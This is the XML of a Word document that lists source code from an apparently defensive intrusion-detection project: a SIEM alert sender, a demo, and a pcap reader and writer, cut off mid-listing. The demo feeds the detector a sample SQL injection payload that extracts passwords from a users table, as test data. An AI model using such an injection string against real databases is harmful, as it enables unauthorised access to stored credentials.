    <w:p w14:paraId="2C6DDF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log error:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E15C850" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74B257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close(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E478D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self.rows_written</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFCA43F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A36047D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1557162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UDPSender:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F917A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"""Ships alerts to the SIEM as structured JSON datagrams.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170E3552" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17204C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FR-5 requires alerts to be serialised "into structured JSON objects" before</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2C4F6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transmission. A JSON frame also lets the dashboard render fields (severity,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37EF79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ATT&amp;CK technique, risk score, source IP) as real columns instead of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79080A0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re-parsing an English sentence on the receiving end.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4476DE6E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F3FFAE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 `ts` text field is retained so an older text-only listener still shows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74893AB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something meaningful, and so the receiver can validate the frame.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9DA32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D888C3E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A79238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__init__(self, target_ip, port=9999, config=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0453E4C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self.target = (target_ip, port)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217D7D9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self.config = config</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6648D4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self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130D95B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self.sent = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B342A3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self.failed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B44A9C4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4431B4F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send_log(self, message, src_ip=None, engine=None, confidence=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F8762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payload=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DA34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meta = mitre.enrich(message, confidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152D31C1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01DA81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limit = getattr(self.config, "payload_excerpt_bytes", 64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36B509C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privacy_mode = getattr(self.config, "privacy_mode", True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A45C36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anonymise = getattr(self.config, "anonymise_ips", False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41656323" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69991C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frame = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D696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 1,                                  # schema version</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105EAD1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"ts": time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B23CB3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"message": privacy.redact(message) if privacy_mode else message,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4738A2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"src_ip": privacy.anonymise_ip(src_ip, anonymise) if src_ip else "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B548D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 engine or meta["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB846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"kind": meta["kind"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B85143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"severity": meta["severity"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B6544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"risk_score": meta["risk_score"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7713A0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"technique_id": meta["technique_id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46FD86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"technique": meta["technique"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071168C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"tactic": meta["tactic"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41EE755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"confidence": None if confidence is None else round(float(confidence), 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7419320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5A1D83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payload:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF098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frame["payload_excerpt"] = privacy.payload_excerpt(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2517AD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payload, limit=limit, privacy_mode=privacy_mode)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18797E14" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07E6723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2EB8CDF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data = json.dumps(frame).encode("utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C1A3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 UDP datagram must stay inside the path MTU to avoid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59ACC5A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fragmentation; excerpts are already capped so this is a guard</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542822B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len(data) &gt; 1400:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C89F0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frame.pop("payload_excerpt", None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="058A5D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data = json.dumps(frame).encode("utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2837EF1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self.sock.sendto(data, self.target)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04DD19C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self.sent += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3131E25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Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C627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self.failed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E68D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udp send error:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD42670" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21D3856F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AB2B8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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4567B9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log = Logger("demo_logs.csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373522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log.log_alert("MALICIOUS PAYLOAD! Keywords: ['UNION', 'SELECT']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7CD6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src_ip="192.168.1.57", confidence=0.99,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C34DF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payload=b"id=1 UNION SELECT password FROM users")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0373A65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log.log_alert("DDoS DETECTED! Z-Score: 4.21 (PPS: 8500)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C1075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src_ip="10.0.0.9", confidence=0.88)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36433C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print("wrote %d rows to demo_logs.csv" % log.rows_written)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7F12D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open("demo_logs.csv", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="420230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print(f.read())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6919BD64"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src/utils/pcap.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B839220" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>193 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2189A59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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A1CAF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"""libpcap (.pcap) reader and writer implemented from the file-format spec.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F492BE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EAE46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The zero-dependency runtime does not use Scapy, dpkt, or libpcap bindings. This</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC6632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module implements the classic libpcap capture-file format directly with</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD64A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`struct`, matching the sensor's manual Ethernet and IP decoding.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F5C67A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DCC21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Two capabilities follow from it:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B2708F4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="738F3B0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Verifiability - captures written by MANTIS open natively in Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D852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and tcpdump for independent frame inspection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEEA6B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Reproducibility - a saved capture can be replayed through the detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477FC0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engines with no root privileges and no live attack traffic, making every</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0539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evaluation run deterministic and repeatable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="627C275C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FFEED4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File layout (libpcap 2.4):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E1BC7A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C08353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global header  24 bytes   magic, version, tz, sigfigs, snaplen, linktype</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71EE4E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per packet     16 bytes   ts_sec, ts_usec, incl_len, orig_len</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E540A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incl_len bytes of raw frame</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5916C898" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A1A592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`incl_len` may be smaller than `orig_len` when a snapshot length is applied;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FDB9A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Wireshark renders such frames as truncated, which is the correct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66BBEB2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representation of a header-only capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5238BC7D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65A3DD4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Standard library only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6CCCC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1AF8BBEC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="534E07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import struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73735D6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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD2A337" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4ACC3F6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MAGIC_MICRO = 0xA1B2C3D4      # timestamps in microseconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A87A9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MAGIC_NANO = 0xA1B23C4D       # timestamps in nanoseconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1274444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LINKTYPE_ETHERNET = 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="116C4BEF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02A9D8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_GLOBAL_HEADER = "IHHiIII"    # 24 bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D54EB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_RECORD_HEADER = "IIII"       # 16 bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A38BAF0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D68637A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18BD14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PcapError(Exception):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C5F3B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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2383F4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="668A04A0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57E057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global_header(snaplen=65535, linktype=LINKTYPE_ETHERNET, endian="&lt;"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5499E4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struct.pack(endian + _GLOBAL_HEADER,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EED83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MAGIC_MICRO,   # magic number</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DB569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2, 4,          # version major, minor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4196A1F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0,             # thiszone (GMT correction)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACFA3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0,             # sigfigs (unused in practice)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC9A0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snaplen,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44162E4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linktype)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21FAA1B4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="271A418C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3551527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record(raw, ts=None, orig_len=None, snaplen=65535, endian="&lt;"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD507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"""Pack one packet record (header + data)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06927D0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ts is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD2A78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ts = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="787255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data = bytes(raw)[:snaplen]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5558AFB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orig_len is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="465A926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orig_len = len(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BAEF10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ts_sec = int(ts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216166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ts_usec = int(round((ts - ts_sec) * 1_000_000))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309A5F0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ts_usec &gt;= 1_000_000:       # guard against rounding to 1.0s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3CB21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ts_sec += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C87E8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ts_usec -= 1_000_000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FBDEC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head = struct.pack(endian + _RECORD_HEADER,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9DBF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ts_sec, ts_usec, len(data), max(orig_len, len(data)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07BCD1A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head + data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C2FFFA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60E308A3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00CF47E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PcapWriter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0752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"""Streaming writer. Usable directly or as a context manager."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53012891" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E7E25B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__init__(self, path, snaplen=65535, linktype=LINKTYPE_ETHERNET):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7878E5B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self.path = path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5112A0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self.snaplen = snaplen</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529DD5E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self.count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C234C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self._fh = open(path, "wb")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4142ED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self._fh.write(global_header(snaplen, linktype))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FABE1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self._fh.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF87C6B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AC9F66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write(self, raw, ts=None, orig_len=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70FFA07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self._fh.write(record(raw, ts=ts, orig_len=orig_len,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BBF2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snaplen=self.snaplen))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A535A0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self.count += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB2124A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C7486D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flush(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6687E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self._fh and not self._fh.closed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31797F6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self._fh.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D19EA10" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="063538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close(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C5C51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self._fh and not self._fh.closed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3827ED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self._fh.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC8C31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self._fh.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F27606" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EA67E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__enter__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14406E9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self</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DF1A62" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3803C3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__exit__(self, *exc):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0368F0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self.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE2957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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8DC4EF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FC8EDA6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A51D7A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PcapReader:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CA7C5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"""Iterate a .pcap file yielding (timestamp, raw_bytes, original_length).</w:t>
